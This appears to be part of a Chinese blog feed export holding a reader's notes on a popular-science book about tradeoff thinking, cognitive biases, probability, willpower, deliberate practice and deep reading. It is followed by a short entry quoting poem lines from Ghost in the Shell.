title="1．“反常识”思维"></a>1．“反常识”思维</h4><p>当我们需要做决定的时候，我们考虑的是具体的事、具体的人和他们具体的表情。在这些具体例子的训练下，我们的潜意识早就学会了快速判断人的真诚度和事件的紧急程度。<br>这种“具体思维”做各种选择的首要标准，是<strong>道德</strong>。<br>我们首要学会的是分辨美丑。这也就是文人思维的起源，针对每个特定动作的美学评价。有时候他们管这种评价叫“价值观”，但所谓的价值观无非就是给人和事贴或好或坏的标签。<br>低端文人研究道德，高端文人研究美感。可是只有刚接触艺术的人才喜欢令人愉悦的东西，审美观成熟到一定程度后我们就觉得快乐是一种肤浅的感觉，改为欣赏愁苦了。<br>有时候文人把自己的价值观判断称为“常识”，因为这些判断本来就是从人的原始思维而来的，然而现代社会却产生了另一种思维，却是“反常识”的。<br>现代社会与古代最大的不同，是人们的生活变得越来越复杂。除了工作学习，我们还要娱乐。参加社交活动、学习和发展以及随时对遥远的公众事务发表意见。我们的每一个决定都可能以一种不直截了当的方式影响他人，然后再影响自己。面对这种复杂的局面，最基本的一个结果是好东西虽然多，你却不能都要。<br>取舍思维，英文有一个形神兼备的词“tradeoff”。它是“理工科思维”的起源。讨价还价一番后达成交易，这对文人来说是一个非常无语的情境！既不美也不丑，既不值得歌颂也不值得唾弃。斤斤计较地得到一个既谈不上实现了梦想也谈不上是悲剧的结果。完全不文艺。<br>“tradeoff”要求我们知道每一个事物的利弊。世界上并没有多少事情是“在没有使任何人境况没有变坏的前提下使得至少一个人变得更好”的所谓“帕累托改进”。<br>理工科思维要求妥协，而文人总爱不管不顾，喜欢说不惜一切代价，喜欢动不动就把全部筹码都押上去的剧情。理工科思维要求随时根据新情况调整策略。<br>《思考，快与慢》将人脑的两套思维系统称为“系统1”和“系统2”。前者自动起作用，能迅速对一个事物给出一个的很难改变的第一印象；而后者费力而缓慢，需要我们集中注意力进行复杂的计算甚至我们在系统2工作时连瞳孔都放大了。系统2根本不是计算机的对手，然而系统1却比计算机强大多了。文人思维显然是系统1的集大成者，而理工科思维则是系统2的产物。<br>“tradeoff”要求量化输入和预计输出，这也是理工思维的根本方法。但人脑天生不适应抽象数字。<br>在大多数公共问题上，常识是不好使的。资源调配即使做不到完全依赖市场，也不应该谁声音大就听谁的。<br>现在到了用理工科思维取代文人思维的时候，传统的文人腔已经越来越少出现在主流媒体上，一篇正经讨论现实的文章总要做点计算才说的过去。</p><h4 id="2-别想说服我"><a href="#2-别想说服我" class="headerlink" title="2.别想说服我"></a>2.别想说服我</h4><p>人做判断的时候有两种机制：一种是“科学家机制”，先有证据再下结论；另一种是“律师机制”，先有结论再去找证据。每个人都爱看能印证自己已有观念的东西，我们不但不爱看，而且还会直接忽略，那些不符合我们已有观念的证据。<br>这个毛病叫“确认偏误”（confirmation bias）。如果你已经开始相信一个东西了，那么你就会主动寻找能够增强这种相信的信息，乃至不顾事实。<br>在确认偏误的作用下，任何新的证据都有可能被忽略，甚至被对立的双方都用来加强自己的观点。可能有人认为只有文化程比较低的人才会陷入确认偏误，文化程度越高就越能客观判断。事实并非如此。在某些问题上，甚至是文化程度越高的人群，思想越容易两极化。<br>人们为了付出的沉没成本而不得不死命拥护自己的派别，也许就是为了表明自己的身份，也许是为了寻找一份归属感。<br>如果是两个理性而真诚的真理追求者讨论问题，争论的结果必然是这两个人达成一致。“why do humans reason?”甚至认为人的逻辑推理能力本来就不是用来追求真理的，而是用来说服别人的。也就是说我们天生就都是律师思维，我们的大脑本来就是个争论设备。这也就是因为进化总是奖励那些能说服别人的人，而不是那些能发现真理的人。<br>人人都只接收符合自己观点的信息，甚至只跟与自己志同道合的人交流，那么就会形成“回音室效应（echo chamber effect）”人们的观点将会变得越来越极端。<br>有鉴于此，约翰逊提出的核心建议是：要主动刻意地消费，吸收有可能修正我们观点的新信息，而不是吸收对我们现有观念的肯定。</p><h4 id="3-真理追求者"><a href="#3-真理追求者" class="headerlink" title="3.真理追求者"></a>3.真理追求者</h4><p>诺贝尔奖获得者罗伯特•奥曼指出，如果是两个理性而真诚的真理追求者争论问题，争论的结果必然是两人达成一致。换句话说如果争论不欢而散，那么必然有一方是虚伪的。</p><h4 id="4-坏比好重要"><a href="#4-坏比好重要" class="headerlink" title="4.坏比好重要"></a>4.坏比好重要</h4><p>损失厌恶：人们对负面感情的重视程度总是超过正面感情。心理学对这个更一般的现象也有个名词，叫“negativity bias”，姑且称之为负面偏见。<br>用核磁共振观察他们的大脑，当试验受试者说“损失”这个词的时候，他们大脑中的信任和（amygdala）兴奋了。这个区域会产生负面情绪。<br>恐惧和冒险是人的两种非常基本的感情。进化心理学认为恐惧来自人的自我保护本能，而冒险来自人的求偶本能。进化是的我们大脑中的恐惧优先级高于浪漫。<br>本能归本能，有人可以超越自己的本能。</p><h4 id="5-最简单概率论的五个智慧"><a href="#5-最简单概率论的五个智慧" class="headerlink" title="5.最简单概率论的五个智慧"></a>5.最简单概率论的五个智慧</h4><h5 id="1-随机"><a href="#1-随机" class="headerlink" title="1.随机"></a>1.随机</h5><p>概率论最基础的思想是，有些思想是无缘无故发生的。<br>大多数事情并不是完全的随机事件，却都有一定的随机因素。人们经常错误地理解偶然事件，总想用必然去解释偶然。<br>理解了随机性，我们就知道有些事情发生就发生了，没有太大可供解读的意义。<br>偶然的错误是不值得深究的，成绩也不值得深究。现代概率论的奠基人之一雅各布•伯努利，甚至认为我们根本就不应该基于一个人的成就去赞美他。用成绩评估一个人的能力，来决定是否让他入学、是否给他升职加薪，是社会的普遍做法，对此人人都服气，童叟无欺非常公平。这还有什么可说的。这还有什么可说的？问题在于，成绩很有可能有很大的偶然因素。失败者没必要要妄自菲薄，成功者也应该明白自己的成功中是有侥幸的。</p><h5 id="2-误差"><a href="#2-误差" class="headerlink" title="2.误差"></a>2.误差</h5><p>后来人们认识到偶然因素永远存在，即使实验条件再精确也无法完全避免随机干扰的影响。</p><h6 id="3-赌徒谬误"><a href="#3-赌徒谬误" class="headerlink" title="3.赌徒谬误"></a>3.赌徒谬误</h6><p>概率论中确实有一个“大数定律”说如果进行足够多次的抽奖，那么各种不同结果出现的频率就会等于它们的概率。<br>但是人们常常错误地理解随机性和大数定律——以为随机就意味着均匀。但大数定律的工作机制不是跟过去平均，它的真实意思是如果未来你再进行非常多次的抽奖，你就会得到非常多的“2”和“6”，以至于它们此前的一点点差异会变得微不足道。<br>“比如号码2已经出现了3期，而号码6已经出现了5期，则再下一次号码2再出现的概率明显大于6”，这完全错误，下一次出现2和6的概率是相等的。这就是一个著名错误“赌徒谬误”。</p><h5 id="4-在没有规律的地方发现规律"><a href="#4-在没有规律的地方发现规律" class="headerlink" title="4.在没有规律的地方发现规律"></a>4.在没有规律的地方发现规律</h5><p>理解随机性和独立随机事件，得出一个结论：独立随机事件的发生是没有规律和不可预测的。<br>未来是不可被精确预测的。这个世界并不像钟表那样运行。</p><h5 id="5-小数定律"><a href="#5-小数定律" class="headerlink" title="5.小数定律"></a>5.小数定律</h5><p>问题的关键是随机分布不等于均匀分布。人们往往认为如果是随机的，那就应该是均匀的，殊不知这一点仅在样本总数非常大的时候才有效。<br>如果统计数字很少，就很容易出现不均匀的情况。这个被戏称为“小数定律”。<br>大数定律是我们从统计数字中推测真相的理论基础。大数定律说如果统计样本足够大，那么事物出现的频率就能无限接近它的理论概率<br>小数定律说如果样本不够大，那么它就会变现为各种极端情况，而这种情况可能跟本性一点关系都没有。</p><h5 id="6-一颗阴谋论的心"><a href="#6-一颗阴谋论的心" class="headerlink" title="6.一颗阴谋论的心"></a>6.一颗阴谋论的心</h5><p>1.美国的阴谋<br>可以解释这些看似“自然”其实“不自然”的事件，我发现其背后有一个不可告人的目的。这种解读是阴谋论。<br>所有阴谋论都有一个共同的思维模式，就是不承认巧合，不承认有些事情是自然而然发生的，认为这一切都有联系、有目的。<br>2.合理性和可能性<br>想要对任何事情的真伪都给出正确的判断是不可能的，我们只能在有限的条件下合理地评估每件事的可能性。阴谋论之所以不足信，是因为其成立的可能性很低。<br>3.目的与科学<br>科学的标志，是对世界的运行给出一套纯机械的机制。<br>很多人研究为什么自然科学没有在中国发生。莫里斯（Ian Morris）在《西方将主宰多久》（Why The West Rules:For Now）说：有一个重要原因是在于中国的传统认为天道是有目的的。我们认为上天有道德观，它降下自然灾害是对皇帝的警告，或者对坏人的惩罚。<br>自然是没有目的，人类社会的很多现象往往也没有目的。<br>人在复杂的现代社会中运动，很大程度上类似于原子在电磁场中的运动，个人意愿能改变的事情很少，绝大多数人都是在随波逐流，复杂的系统也会出现非常激烈的“事件”。有人用计算机模拟发现，哪怕没有任何消息输入，仅仅是交易者之间的简单互动，也可能让股价产生很大波动。这些波动的发生并没有什么目的。每一次金融危机都会有阴谋论者站出来说这是谁谁为了某个目的故意制造的，但事实上，美联储对金融市场的控制手段非常有限。在正经的经济学家看来，把1997年亚洲金融危机归罪于索罗斯是非常可笑的事情。</p><h5 id="7-桥段会毁了你的生活"><a href="#7-桥段会毁了你的生活" class="headerlink" title="7.桥段会毁了你的生活"></a>7.桥段会毁了你的生活</h5><p>《连线》杂志的布朗（Scott Brown）在谈到“TV Tropes”时发出感慨，认为原创剧情已经消失了。其实也不至于。真正的原创剧情是高雅文学和文艺片的事情，流行文学和商业片只需要“好用的”剧情。评价严肃的作品，往往要看它是不是发明了独一无二的人物和剧情。所以严肃文学作家是科学家，通俗文学作家是工程师。</p><p>可是最好的程序员仍然可以把编程从技术上升到艺术的境界。</p><h5 id="8-健康的经济学"><a href="#8-健康的经济学" class="headerlink" title="8.健康的经济学"></a>8.健康的经济学</h5><p>如果没每加班1小时都一定能使寿命减少5分钟，恐怕就不会有这么多人加班了。但工作时间与健康并不是一个确定的关系，而是一个概率关系。<br>而且统计表明那些工作很轻松，生活无压力的人反而不如努力工作的人长寿。<br>一个选择了高风险高回报的人在健康出问题后应该愿赌服输——再给他们一次机会很可能还是这样选。</p><h5 id="9-核电站能出什么大事"><a href="#9-核电站能出什么大事" class="headerlink" title="9.核电站能出什么大事"></a>9.核电站能出什么大事</h5><p>1.核爆<br>要自爆核电站以报复人类，核电站也不会像原子弹一样爆炸。因为原材料纯度远远不够。事实上，维持核电站反应堆中的链式反应是很不容易的，以至于如果失控，链式反应会立即停止。燃料会继续变热，像日本这样需要灌水冷却，但这种变热不是链式反应，也就是说哪怕你不管了，让燃料自己变冷它也不会发生核爆。<br>核电事故的有害性在于辐射。核电站泄漏对于公众的危害是癌症。<br>2.癌症<br>3.哲学</p><h3 id="Part2-成功学的解药"><a href="#Part2-成功学的解药" class="headerlink" title="Part2 成功学的解药"></a><strong>Part2 成功学的解药</strong></h3><p>我们需要的是科学的励志，只有你的理论有意义，你的成功才可以复制。</p><h4 id="1-科学的励志和励志的科学"><a href="#1-科学的励志和励志的科学" class="headerlink" title="1.科学的励志和励志的科学"></a>1.科学的励志和励志的科学</h4><p>如今有了一些励志书，它们不再依赖名人轶事，而是借助试验和统计。这些书的理论背后都有严肃的学术论文作为依据，它们是几十年来心理学和认知科学的进步的结果。在科学家看来，乔布斯的个性管理也许不根本不值得推广，而扎克伯格的所谓天才霸业，远远比不上一群普通学生在几个月内的整体进步有研究价值。科学家，是励志领域一股拨乱反正的势力。<br>想知道什么品质对成功最重要，科学的办法不是看名人传记，而是进行大规模的统计。<br>真正能左右成绩的品质只有一个：自控。<br> 研究者普遍认为，排除智力因素，不管你心目中的成功是个人成就、家庭幸福还是人际关系，最能决定成功的只有自控。<br>自控需要意志力。意志力其实是一种生理机能。它就好像人的肌肉一样每次使用都需要消耗能量，而且用多了会疲倦。<br>意志力是一种有限资源。<br>如何提高意志力？研究者推断：人的意志力能量来自血液中的葡萄糖。 我们可以想办法合理支配这种资源，甚至像在锻炼肌肉一样增加意志力的容量。<br>除了好习惯可以减少意志力的消耗外，作者提到另外一种重要自控手段是自我监视。<br>真正有效的办法是“常立志”。意志力是一种通用资源，则意味着你可以通过做一些日常的小事来提高意志力，然后把它用在其他事情上。本书提出一个有效的练习办法是做自己不习惯做的事。<br>意志力显然不是人们喜欢自夸的能力。<br>尽管亚裔只占美国人口的4%，亚裔学生却占到斯坦福等顶级名校的25%。但统计表明同样是进入一个高智商的行业，白人需要智商110，而亚裔只需要103。<br>亚裔靠的是意志力。有实验发现，中国的小孩从两岁开始就比美国的小孩有更强的自控能力。不管什么中国文化虽然不怎么擅长科学思维，也不太明白意志力到底是什么，它却在意志力的实践上遥遥领先。</p><h4 id="2-匹夫怎样逆袭"><a href="#2-匹夫怎样逆袭" class="headerlink" title="2.匹夫怎样逆袭"></a>2.匹夫怎样逆袭</h4><p>关键在于两点：<br>第一，    你要知道你的不利条件，在某些情况下可能是你的有利条件；而巨人的所谓有利条件，在某些情况下可能是他的不利条件。<br>第二，    你绝对不能按照对手的打法去跟他玩，你有时候得使用非常规手段。<br>尼采说过，“凡不能使我毁灭的，必使我强大。”<br>既然优势和劣势可以互相转化，我们就不应该一味追求加强某一方面的优势，正所谓过犹不及。维护现有社会格局和强调遵守游戏规则，那是高富帅的事。而改变规则则是匹夫的特权。</p><h4 id="3-练习一万小时成天才？"><a href="#3-练习一万小时成天才？" class="headerlink" title="3.练习一万小时成天才？"></a>3.练习一万小时成天才？</h4><p>强调练习的同时绝对不能否定天赋的重要性。真正的关键根本不是训练时间的长短，而是训练方法。<br>练习，讲究的并不是谁练的最苦，或者谁的心最“诚”。<br>坏消息是高水平训练的成本很高。你需要一位掌握这个领域的先进知识的最好的教练，你需要一个有助于你提高能力的外部环境——这通常意味着加入一所好大学或者入选一个好的俱乐部，你要忍受一点都不舒服的训练方法，而且你需要投入非常多的时间。<br>好消息是各个领域的不同训练方法也都存在着一些共同特征。<br>科学的练习方法并不是从天而降的神秘招式，它一定程度上已经存在于我们的生活之中。它不是科学家的发明，而是科学家对各个领域高手训练方法的总结。人们一直在各个领域中不自觉地使用这些方法。<br>这一套练习方法，就是“刻意练习（deliberate practice）”。<br>去除一些不重要的，总结如下：</p><ol><li>只在“学习区”练习；</li><li>把要训练的内容分成有针对性的小块，对每一小块进行重复训练；</li><li>在整个练习过程中，随时能获得有效反馈；</li><li>练习时注意力必须高度集中。</li></ol><p>几点说明：许多人把困难事情干成认为是靠干事业人某种“内在”品质。比如归于拼搏精神，可是如果是怎么也干不成的事业，归于中国人的素质，作者不能赞同这种凡是往特别简单或者特别复杂了说的思维。首先，干事业不是靠拼命就行，其次，干事业就是干事业，没必要先把官场文化和春秋以来的儒家思想都研究、批判和改造一遍。<br>过分强调“功夫在诗外”这句陆游名言也是不对的。<br>想要成为某一领域的顶尖高手，关键在于“刻意”地在这个领域内，练习。</p><ol><li><p>只在“学习区”学习<br>心理学家把人的知识和技能分为层层嵌套的三个圆形区域：最内一层是“舒适区”，使我们已经熟练掌握的各种技能；最外一层是“恐慌区”，是我们暂时无法学会的技能，二者中间则是“学习区”。<br>有效的练习任务必须在受训者的学习区内进行，它具有高度的针对性。训练者必须随时了解自己最需要改进的地方。一旦学会某个东西，就不应该继续在上面花费时间，应该立即转入下一个困难点。<br>在舒适区做事，叫生活；在学习区做事，才叫练习。<br>脱离舒适区，需要强大的意志力，甚至是一种修炼。<br>每天都给自己定一个更远的目标。</p></li><li><p>掌握套路<br>刻意练习的基础部分：基础训练。也就是套路。<br>人所掌握的知识和技能绝非是零散的信息和随意的动作，它们大多数具有某种“结构”，这些“结构”就是套路。下棋用的定式，编程用的固定算法，这些都是套路。<br>心理学认为人的工作能力主要依靠两种记忆了：“短期记忆力”（short term working memory）和长期记忆力（long term working memory）短期工作记忆类似于电脑内存，是指人脑在同一时刻能够处理的事情的个数——一般来说四个，它与逻辑推理能力、创造性思维有关，也就是智商很有关系，它很难通过训练得到。<br>长期工作记忆储存了我们的知识和技能。它有点类似于计算机硬盘，但比硬盘高级多了。关键在于，长期工作记忆并非是杂乱无章。随便储存的，它是以神经网络的形式运作，必须通过训练才能储存，而且具有高度的结构性。心理学家把这种结构称为“块”（chunk）。<br>人的技能，取决于这两种工作记忆。专家做的事，就是使用有限的短期工作记忆，去调动自己几乎无限的长期工作记忆。而刻意练习，就是在大脑中建立长期工作记忆的过程。</p></li></ol><p>两种套路<br>对于脑力工作者，水平的高低关键要看掌握的套路有多少。<br>以量取胜的套路是容易掌握的。<br>但有些套路，比如那些非纯脑力劳动的非专业技能，想要掌握就没那么容易了。<br>人脑是如何掌握一个技能的，一个比较主流的结论是说这是神经元的作用。完成一个动作需要激发很多神经元，如果这个动作被反复做，那么这些神经元会被反复地一起激发。而神经元有个特点，就是如果经常被一起激发，它们最终会连在一起！！因为每个特定技能需要调动的神经元不同，不同技能在人的大脑就形成了不同的网络结构。另有一个理论则认为神经元的连接必然重要，但更重要的则是包裹在神经元伸出去的神经纤维（轴突）外面的一层髓磷脂组成的膜：髓鞘。如果我们把神经元想象成元器件，那么神经纤维就是连接元器件的导向，而髓鞘则相当与包在导线外面的胶皮、这样用胶皮把电线包起来防止电脉冲外泄，能够使得信号被传输地更强，更快，更准确。当我们正确地练习时，髓鞘就会越包越厚，每多一层就意味着更高的准确度和更快的速度。髓鞘，把小道变成告诉公路。<br>不论是哪种理论，最后我们都可以得出这样的结论：技能是人脑中的一种硬件结构，是“长”在人脑中的。这意味着如果你能打开大脑，你就会发现每个人脑中的神经网络结构都不一样。技能很不容易获得，一旦获得了也很难抹掉。<br>如此一来，高手与普通人就有了本质的区别。高手拥有长期训练获得的特殊神经脑结构，他的一举一动可能都带着不一般气质，连眼神都与众不同，简直是用特殊材料制成的人。练习，是对人体的改造。<br>用什么方法才能迅速把技能套路“长”在身上呢？关键在于两点：</p><ol><li>必须进行大量的重复训练；</li><li>训练必须有高度针对性。</li></ol><ul><li>基本功<br>磨刀不误砍柴工，基本功就是这么重要。不但体育和音乐需要练基本功，就连那些人们认为不存在基本功的领域，也要练基本功。</li><li>重复！重复！再重复！<br>  想把一个动作套路，一个技能，哪怕仅仅是一个生活习惯，甚至是一种心态，“长”在大脑之中，唯一的办法是不断重复。<br>  这种把不常见的高难度事件重复化也是MBA课程的精髓</li><li>高度针对性<br>  想要掌握一项技能，要像运动员一样，需要不停地练习实战动作，不停地比赛，而不是不停地看录像。</li><li>随时获得反馈<br>  从刻意练习角度，这就是即时的反馈（immediate feedback）在有即时反馈的情况下，一个人的进步速度非常之快，而且是实实在在的。</li><li>一定要有反馈<br>  想要真正的理解，唯一的办法是考试和测验。这就是反馈！没有测验，你的知识只是幻觉。</li><li>立即反馈<br>  老师的作用<br>  现代老师的最大作用是什么？及时反馈。一个动作好不好，最好有教练随时指出，本人必须能够随时了解练习结果。看不到结果的练习等于没有练习。在某种程度上，刻意练习是以错误为中心的练习。练习者必须要对错误及其敏感，一旦发现自己错了就会感到非常不舒服，一直练习到改正为止。</li><li>学徒制<br>  作者认为真正的人才不是靠课程、院系、考试大纲培养出来的。培养人才的有效办法只有一个，那就是学徒制。</li><li>刻意练习不好玩<br>  2005年，“刻意练习”概念的提出者埃里克森（K.Anders Ericeeon）领导的小组表明，决定性因素不是学习时间，而是学习环境。<br>  研究人员发现，排除以往成绩的话，只有一个因素能预测他成绩的变化，就是学习环境。</li><li>单独练习<br>  刻意练习需要练习者调动大量的身体和精神资源，全力投入。<br>  研究人员发现，所有学生都了解一个道理：真正决定你水平的不是全班一起上的音乐课，而是单独练习。<br>  所以我们再次发现所谓的“一万小时”实在是个误导人的概念。练习时间长短并不是最重要的，真正关键是你“刻意练习”——哪怕仅仅是“单独练习”——的时间。可见要想成为世界级高手，一定要尽早投入训练，这就是为什么天才音乐学家都是从很小的时候就开始苦练。</li><li>练习与娱乐<br>  在刻意练习中没有“寓教于乐”这个概念。<br>  如果你想学点知识，最好的办法是找本书——最好是正规的教科书或者专业著作——然后老老实实地找个没有人的地方坐下反复读，而且还有自己整理笔记，甚至做习题获得反馈。</li><li>练习需要重复，而重复一定不好玩。<br>  谁愿意练习一万小时？<br>  刻意练习需要学习者精神高度集中，是一种非常艰苦的练习，人的精力只能做这么多。<br>  世界就是属于这极少数人的。世界并不需要一千个钢琴大师或者一万个足球明星，这些少数的幸运儿已经把所有位置都占满了。如果你想要享受快乐童年，你的位置在观众席。<br>  刻意练习不好玩。伟大的成就需要放弃很多很多东西，而这种放弃并不是没有争议的。<br>  我不知道虎妈的育儿法是否对整个社会有力，但我相信虎妈一定明白一个道理：如果你想出类拔萃，那么你要参与的这场竞争很大程度上是个零和博弈——你想赢就意味着有人要输，你拿到这个位置就意味着有人拿不到这个位置。像这种博弈对社会有没有好处对你不重要，你关心的是怎么做对自己有好处。这个博弈没有双赢。<br>  这不是一般人玩的起的游戏。</li><li>孤注一掷<br>  体育、音乐和表演，都是高投入高风险的事情，明星的背后是无数个失败的垫背。想要成功，就得练习一万小时，但考虑到机遇因素，即使你练了这一万小时也未必成功，这其实是一场赌博。<br>  下这么大赌注练习，绝对不仅仅是为了博女朋友一笑，与之对等的回报是整个世界的认可。高水平的运动员有一个共同特点：他们非常，非常，非常非常想赢得比赛。<br>  真正使得乔丹成为巨星的“素质”，是对失败的痛恨。</li><li>奖励机制<br>  一般人当然用不着孤注一掷地刻意练习，但还是需要一点刺激才能练下去，因为只要是有用的练习都好玩。<br>  一个可能的结论似乎是奖励学习过程，比只看学习的结果效果更好。</li><li>兴趣和基因<br>  学习一个技能的初期，智商可能是决定性因素。但是随着学习的深入，兴趣的作用可能就越来越大了，因为兴趣可以相当的大的程度上决定谁能坚持下来。<br>  决定一个学生进步的幅度的不是智商，而是内在动力和学习方法。<br>  科学界的共识是，先天因素远远大于后天因素。<br>  寻找适合自己兴趣的环境，把自己的基因发扬光大——这难道不就是进化论告诉我们的人生的意义吗？</li></ul><h4 id="4-最高级的想象力是不自由的"><a href="#4-最高级的想象力是不自由的" class="headerlink" title="4.最高级的想象力是不自由的"></a>4.最高级的想象力是不自由的</h4><p>所以，最高级的想象力其实是不自由的。正是因为不自由，它的难度才大。自由的“what if”思维，只是高级想象力活动的第一步，其背后不自由的东西才是关键。</p><h4 id="5-思维密集度与牛人的反击"><a href="#5-思维密集度与牛人的反击" class="headerlink" title="5.思维密集度与牛人的反击"></a>5.思维密集度与牛人的反击</h4><p>“思维密集度”=准备这个读物需要的总时间/阅读这个读物需要的时间</p><h4 id="5-上网能避免浅薄么？"><a href="#5-上网能避免浅薄么？" class="headerlink" title="5.上网能避免浅薄么？"></a>5.上网能避免浅薄么？</h4><p>只有有意识的短期记忆，称为工作记忆，才有可能被转化为长期记忆。过去心理学家曾经认为人的工作记忆只能同时容纳7条信息，而最新的研究成果是最多只有2~4条。这样有限的容量非常容易被无关信息干扰导致过载。上网时分散的注意力，不停地为点还是不点做决定，都在阻碍我们把短期记忆升级为知识。<br>上网的关键态度是要成为网络的主人，而不做各种超链接的奴隶。高效率的上网应该像自闭症患者一样具有很强的目的性，以我为主，不被无关信息左右。就算是纯粹为了娱乐上网也无可厚非，这时候读的快就是优点。</p><h4 id="6-高效“冲浪”的办法"><a href="#6-高效“冲浪”的办法" class="headerlink" title="6.高效“冲浪”的办法"></a>6.高效“冲浪”的办法</h4><p>第一步，随便翻翻（toss）<br>效率的首要关键是集中。我们先做的不是读新闻，而是挑选新闻。<br>第二步，略读（skim）<br>第三步，精读（read）<br>这种先集中选择再采取行动的办法并不仅限于新闻阅读，其实有更为广泛的应用。诺贝尔经济学奖得主丹尼尔•卡尼曼在《思考，快与慢》一书中介绍了两个著名的心理学概念：“窄框架”（narrow framing）和“宽框架”（broad framing）。所谓窄框架，就是遇到一个东西做一次决策，一事一议；而宽框架则是把所有东西都摆在桌面上集中选择。</p><h4 id="7-笔记本就是力量"><a href="#7-笔记本就是力量" class="headerlink" title="7.笔记本就是力量"></a>7.笔记本就是力量</h4><p>记笔记，是一个被动的行为。你现在甚至不用自己记，软件的工具可以让你在几次点击之内记录下任何需要记下的信息。但真正的好笔记确实主动的，它不仅仅是对客观事物的记录，更是对自己思想的记录。<br>哪怕有一天维基百科、百度知道再加上人工智能可以向我们提供所有问题的答案，它们仍然不能取代人脑中的真正知识。这是因为真正的知识是分层的。你必须完全理解基础的一层，才能谈得上去看懂上面的一层。如果你没学过微积分，就算有人把人类历史上广义相对论的全部文本摆在你面前也没用。知识，不能仅仅机械地“存”在你脑子里，而必须以一种个性化的结构“长”在你的脑子里。通过个人笔记本来不断总结自己个性化的理解。恰恰可以帮助我们“长”知识。<br>理解知识需要笔记，使用知识也需要笔记。<br>真正的专家，都有自己一整套知识体系。这套体系就如同长在他们心中的一颗不断生枝长叶的树，又如同一张随时变大变复杂的网。每当有新的知识进来，他们都知道该把这个知识放到体系的什么位置上去。有人管这套体系叫做心智模式（mental model），有人管它叫矩阵（matrix）。有了这套体系，你才可能对相关事务作出出神入化的“眨眼判断”，而不是靠什么“灵感”或者“直觉”。<br>所以，记笔记的最直接的目的是为了形成自己的知识体系，改变自己看事物的眼光。<br>笔记系统的一个附带好处是它可以帮助我们把新的知识跟自己已有的知识联系起来。一般人善于发现新事物的不同点，而真正的高手则善于发现共同点。一旦发现新的知识和已有知识的共同点，这个知识就彻底“长”在我们身上了。而且这样带来的类比和联想，特别能刺激创造性思维。只有你把它们全部拆开、撕碎，再重新组合成你的东西，它们才真正属于你。<br>我们要做的就是“吃进”很多信息，然后生产笔记本。</p><p><strong>用强力读书</strong></p><p>读书却可以及大幅度地提升人的思想内力，这种内力是对世界的理解和见识。<br>《如何阅读一本书》这本书提出一种精神：为了娱乐而读，为了信息而读和为了理解而读。首先，只有为了理解某个我们原来不懂的东西而读书，才值得认真对待。其次，读书应该以我为主，而不是以书为主。<br>强力阅读<br>强力阅读更像是一种态度和心法。作者更想起名叫Deep Reading。<br>“强力阅读”并不是为了读《广义相对论》之类的专业著作，它面向的对象是《卧底经济学》之类写给非专业读者的非小说类书籍。称为“强力”，是因为它追求阅读的深度和效率，力图能在一本书中挖掘到最大限度的收获。<br>强力阅读跟“刻意练习”有三个共同点：<br>第一，    不好玩。用非常严肃认真的态度，非得把一本书融会贯通以至于“长”在自己的大脑里不可。<br>第二，    用时少。就如同在那种专门培养天才的最好的音乐学校里，孩子们每天真正练琴的时间绝对不超过2个小时一样。没人能长时间坚持那样的强度，而没有强度•的训练还不如不练。要把精力充沛而又不受打扰的时间段留给最好的书。<br>第三，    不追求块。读书的一个关键技术在于对于不同的读物采取不同的阅读速度。</p><p>以下是强力阅读的具体做法，它的核心技术是读书笔记。<br>新书要读两遍<br>一本书应该被读两遍，而且只读两遍，我们说的思想类书籍，不是什么学术著作。而且最优效率的办法是读完一遍马上再读一遍。<br>第一遍是正常通读，只要放松欣赏作者的精妙思想和有趣故事即可。<br>在读第二遍的同时写下读书笔记。要专注于思想脉络。读一章，记一章笔记。<br>什么是好的读书笔记？<br>强力研读要求读书笔记必须包括四方面内容：</p><ol><li>清晰地表现每一章的逻辑脉络</li><li>带走书中所有的亮点</li><li>有大量的自己的看法心得</li><li>发现这本书和以前读过的其他书或文章的联系<br>重要的是一定要看出作者的逻辑脉络。<br>读书笔记的第一作用就是抛开故事记住文章。让一本书从厚变薄，从具体的山川景色变成抽象的地图。只有当你跳出字里行间，以居高临下的姿态俯视全书，它的脉络才能变得清晰。<br>读书，在某种程度上就是在寻找能够刺激自己思维的那些亮点。强力研读是一种主动的读书方法。要在笔记中写下自己对此书的评论，好像跟作者对话一样。<br>你不可能对说的好的一段话无动于衷。你可以写下自己对这件事的理解，你还可以写下对作者的质疑或肯定。更高级的批注则是写下自己因为这段文字而产生的灵感。一本好书的每一章都能让人迸发出十个以上的灵感。也许它就解决了你之前一直关注的问题——尽管这个问题看似与此书无关；也许你会想把作者的理论往前推一步。这些想法未必有用，但是都非常宝贵，因为如果你不马上记下来，它们很快就会忘记。也许多年以后翻阅笔记的时候你会觉得自己的心得灵感比原书更有价值。</li></ol><p>如果你读的足够多，你会获得一种更难得的经历：感受人类知识的进步。<br>好书之所以读两遍，最重要的目的就是为了获得这些心得、灵感和联系。第一遍是为了陷进去，第二遍是为了跳出来。<br>记笔记是对一本书最大的敬意。读书笔记是一种非常个性化的写作，是个人知识的延伸。它不是书评，它完全是写给自己而不是为了公开发表——可以完全专注于意思，而不必关心文章。<br>所以“眼过千遍不如手过一遍”【心过一遍】，而且用思维导图做笔记是真的没用。</p><p>电子书<br>读书人的武功<br>强力研读要求慢读，但是我们知道很多著名的读书人的读书速度却都很快，这是为什么呢？这就是武功。他们读的快，是因为对他们来说一般的书里，新的东西已经非常有限。<br>比尔盖茨、查理芒格、沃伦巴菲特</p><p>【下面的文章有时间再写，缓慢一段时间】<br>创新是落后者的特权：三个竞争故事<br>————————————————</p>]]></content>
      
      <categories>
          
          <category> Essay </category>
          
          <category> Book </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随想 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>攻壳机动队</title>
      <link href="/2017/12/12/%E6%94%BB%E5%A3%B3%E6%9C%BA%E5%8A%A8%E9%98%9F/"/>
      <url>/2017/12/12/%E6%94%BB%E5%A3%B3%E6%9C%BA%E5%8A%A8%E9%98%9F/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="/2017/12/12/攻壳机动队/img12.png" alt=""><br>生死去来<br>棚头傀儡<br>一线断时<br>落落磊磊</p><p>若吾起舞时，<br>丽人亦沉醉。<br>若吾起舞时，<br>皓月亦鸣响。<br>神降合婚夜，<br>破晓虎鸫啼。<br>远神惠赐。</p>]]></content>
      
      
        <tags>
            
            <tag> 随想 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>星际穿越出现的诗</title>
